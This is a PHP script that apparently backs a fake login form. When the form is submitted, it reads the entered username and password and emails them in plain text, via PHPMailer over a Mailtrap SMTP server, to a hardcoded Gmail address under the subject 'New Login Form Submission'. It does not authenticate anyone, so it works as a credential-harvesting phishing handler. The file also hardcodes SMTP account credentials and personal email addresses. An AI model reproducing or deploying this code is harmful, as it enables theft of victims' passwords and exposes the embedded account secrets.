<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Include PHPMailer files
require 'C:/wamp64/www/campo/PHPMailer/src/Exception.php';
require 'C:/wamp64/www/campo/PHPMailer/src/PHPMailer.php';
require 'C:/wamp64/www/campo/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $ssl = isset($_POST['ssl']) ? 'Yes' : 'No';

    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->isSMTP(); // Set mailer to use SMTP
        $mail->Host       = 'sandbox.smtp.mailtrap.io'; // Specify Mailtrap SMTP server
        $mail->SMTPAuth   = true; // Enable SMTP authentication
        $mail->Username   = 'dba243988355a0'; // Mailtrap username
        $mail->Password   = '57b10da3be953b'; // Mailtrap password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Enable TLS encryption
        $mail->Port       = 2525; // TCP port for TLS

        // Disable verbose debug output
        $mail->SMTPDebug = 0; // 0 = off, 1 = commands, 2 = data and commands

        //Recipients
        $mail->setFrom('raaam0maan4@gmail.com', 'Your Name'); // Use a valid sender email address for testing
        $mail->addAddress('chinakageorge.i@gmail.com'); // Recipient email address

        //Content
        $mail->isHTML(false); // Set email format to plain text
        $mail->Subject = 'New Login Form Submission';
        $mail->Body    = "Username: $username\nPassword: $password\nSSL: $ssl";

        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
